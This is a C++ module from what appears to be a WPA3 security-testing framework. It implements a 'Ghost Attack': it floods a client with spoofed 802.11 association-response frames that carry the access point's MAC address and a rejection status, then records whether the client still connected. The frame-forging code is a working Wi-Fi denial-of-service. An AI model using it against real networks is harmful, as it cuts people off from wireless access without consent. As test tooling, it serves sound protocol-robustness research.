#include "attacks/DoS_hard/no_connect/ghost_attack/ghost_attack.h"
#include "attacks/DoS_hard/no_connect/no_connect_helpers.h"
#include <tins/tins.h>
#include "attacks/components/setup_connections.h"
#include "logger/log.h"
#include "logger/log_util.h"
#include "net_parser/dot11_defs.h"
#include "visual/result_helper.h"
using namespace std;
using namespace Tins;
namespace wpa3_tester::ghost_attack {
void setup_attack(RunStatus &rs) {
	components::setup_AP(rs, "ap");
}
static frame_raw_t build_reject_assoc_resp(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
	Dot11AssocResponse resp(sta_mac, ap_mac);
	resp.addr3(ap_mac);
	resp.capabilities().ess(true);
	resp.status_code(dot11::STATUS_INVALID_AKMP);
	resp.aid(0);
	RadioTap rt;
	rt.inner_pdu(resp);
	return rt.serialize();
}
void run_attack(RunStatus &rs) {
	const HWAddress<6> ap_mac = rs.get_actor("ap").get(SK::mac);
	const int injections = no_connect::run_flood_attack(rs,
		"Ghost Attack: flooding fake AssocResp (STATUS_INVALID_AKMP)",
		[&]() -> frame_raw_t {
			// called after setup_STA so SK::mac is populated
			const HWAddress<6> sta_mac = rs.get_actor("client").get(SK::mac);
			return build_reject_assoc_resp(ap_mac, sta_mac);
		});
	log(LogLevel::INFO, "Attack ended, {} AssocResp injections", injections);
	const bool client_connected = !get_time_logs(rs, "ap", "AP-STA-CONNECTED", visual::helper::get_run_window(rs)).empty();
	rs.save_result({{"client_connected", client_connected}});
}
void stats_attack(const RunStatus &rs) {
	no_connect::stats_attack(rs);
}
}
